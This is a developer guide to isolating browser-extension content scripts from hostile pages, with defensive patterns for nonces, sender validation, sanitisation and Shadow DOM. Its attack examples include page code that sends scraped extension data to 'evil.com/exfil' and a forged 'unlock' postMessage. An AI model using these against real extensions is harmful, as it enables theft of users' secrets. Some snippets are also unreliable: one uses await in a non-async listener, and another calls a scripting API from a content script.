# Content-script ↔ page world isolation

## The three worlds

Under MV3, content scripts run in an **isolated world**. The same DOM is shared, but the JS environments are separate:

| World | Has DOM? | Has page's globals? | Has `chrome.*`? |
|---|---|---|---|
| Content script (isolated) | ✅ shared with page | ❌ separate | ✅ (partial — runtime/storage) |
| Page main world | ✅ shared with content scripts | ✅ | ❌ |
| Background SW | ❌ | ❌ | ✅ all |

A variable set in the page world is invisible from the content script and vice versa. They communicate via:

1. The shared DOM (read/write attributes, but anyone can see them).
2. `window.postMessage` (cross-world).
3. Custom events.

## Why isolation matters

The page is hostile. Anything in the page's JS world can be:

- A trusted dApp talking to your wallet extension.
- A phishing site mimicking the dApp.
- A page with an XSS vulnerability that's been popped.

Your content script must assume the page might be hostile and validate everything coming from it.

## The two attack patterns

### Pattern A: page tries to read content script's data

```js
// page code (hostile)
const stuff = document.querySelector('[data-my-extension-vault]')?.dataset.vault;
fetch('https://evil.com/exfil', { method: 'POST', body: stuff });
```

**Defense**: Don't store extension data in DOM attributes that the page can read. If you must (for content script ↔ page world coordination), use random short-lived keys and clean up.

### Pattern B: page sends fake messages to background

```js
// page code (hostile)
window.postMessage({ source: 'my-ext-cs', cmd: 'unlock', passphrase: 'guess' }, '*');
```

The hostile page can `postMessage` anything. If your content script naively forwards `postMessage` data to the background as if from the user, the background may act on it.

**Defense**: validate `event.origin`, validate `event.source === window`, use nonces, and **don't forward sensitive commands from content script messages**.

## The nonce pattern

```ts
// content script
const NONCE = crypto.randomUUID();
const pendingRequests = new Map<string, (response: any) => void>();

// 1. Inject the page-world script and tell it the nonce
chrome.scripting.executeScript({
  target: { tabId: /* current */ },
  world: 'MAIN',
  func: (nonce) => {
    (window as any).__ext_nonce = nonce;
    // ... rest of page-world logic
  },
  args: [NONCE],
});

// 2. Listen for messages from page world
window.addEventListener('message', (event) => {
  if (event.source !== window) return;
  if (event.origin !== window.location.origin) return;
  if (event.data?.source !== 'page-world') return;
  if (event.data?.nonce !== NONCE) return;  // foreign source
  // ... handle
});

// 3. Send from content script to page world
function sendToPage(payload: object): Promise<any> {
  const requestId = crypto.randomUUID();
  return new Promise((resolve) => {
    pendingRequests.set(requestId, resolve);
    window.postMessage({
      source: 'content-script',
      nonce: NONCE,
      requestId,
      payload,
    }, window.location.origin);
  });
}
```

The nonce is the secret only known to the content script and the page-world script (they're cooperating, same extension). Hostile page code doesn't see it. If a message arrives without the right nonce, it's not from our injected page-world script.

But: the page code can read `__ext_nonce` from window (since it's in the page world). To prevent that:

```ts
// Use a closure instead of window globals
chrome.scripting.executeScript({
  target: { tabId },
  world: 'MAIN',
  func: (nonce) => {
    (function() {
      const N = nonce;
      // ... all your page-world logic, using N from closure
    })();
  },
  args: [NONCE],
});
```

After the IIFE runs, `nonce` is captured in the closure but not exposed on `window`. Hostile page code can't read it.

## Trusted senders

In the background SW, validate `sender`:

```ts
chrome.runtime.onMessage.addListener((cmd, sender, sendResponse) => {
  // 1. Must come from this extension
  if (sender.id !== chrome.runtime.id) {
    sendResponse({ error: 'untrusted-extension' });
    return;
  }

  // 2. Different trust for content scripts vs extension UI
  const isFromContentScript = Boolean(sender.tab);

  switch (cmd.type) {
    case 'getPublicData':
      // Safe from anywhere
      handleGetPublicData(sendResponse);
      break;

    case 'unlockVault':
      // Only from extension UI (popup/options), never from content script
      if (isFromContentScript) {
        sendResponse({ error: 'not-allowed-from-content' });
        return;
      }
      handleUnlock(cmd, sendResponse);
      break;

    case 'autofillField':
      // From content script, but rate-limited and origin-checked
      if (!isFromContentScript) {
        sendResponse({ error: 'expected-content-origin' });
        return;
      }
      if (await isRateLimited(sender.tab!.id!)) {
        sendResponse({ error: 'rate-limited' });
        return;
      }
      handleAutofill(cmd, sender, sendResponse);
      break;
  }
  return true;
});
```

The rule: **the most sensitive commands should only be reachable from the most trusted contexts (popup/options).**

## DOM injection safety

Content scripts often add DOM elements to the page. Risks:

```ts
// ❌ XSS via innerHTML
el.innerHTML = `<div>${userName}</div>`;  // userName from page → injected

// ✅ Use textContent or createElement
const div = document.createElement('div');
div.textContent = userName;
el.appendChild(div);
```

If you must use `innerHTML` (rich content), sanitize with DOMPurify:

```ts
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(richHtml);
```

Or use a framework that handles escaping (React, Vue) and never call `dangerouslySetInnerHTML` / `v-html` on untrusted input.

## Shadow DOM for UI

If your content script renders UI (overlays, sidebars), put it in Shadow DOM to isolate from the page's CSS:

```ts
const host = document.createElement('div');
const shadow = host.attachShadow({ mode: 'closed' });
shadow.innerHTML = '<style>...</style><div>...</div>';
document.body.appendChild(host);
```

- `mode: 'closed'` makes `host.shadowRoot` return null from page JS, harder to attack.
- The page's CSS doesn't bleed into your UI; your CSS doesn't leak into the page.

Plasmo's CSUI is the best-in-class implementation of this. If you're using WXT, you do it manually.

## What never to do

- ❌ Forward `event.data` from `window.postMessage` to the background without validation.
- ❌ Store sensitive data in DOM attributes or `data-*` properties.
- ❌ Trust messages from content scripts as if they came from the user.
- ❌ Inject script tags pointing to page-author-controlled URLs.
- ❌ Use `eval` or `Function(string)` in content scripts.
- ❌ Assume the page's DOM is the DOM you expect — page code can `MutationObserver` your additions and re-mutate them.

## Testing isolation

Write a Playwright test that visits a hostile page and asserts your extension behaves correctly:

```ts
test('extension does not leak vault to page', async ({ page }) => {
  await page.goto('https://hostile-test-page.local');
  // ... unlock the vault via UI
  const leaked = await page.evaluate(() => (window as any).__leaked_vault);
  expect(leaked).toBeUndefined();
});
```

Maintain a hostile test page in `tests/fixtures/` that tries the common attacks.
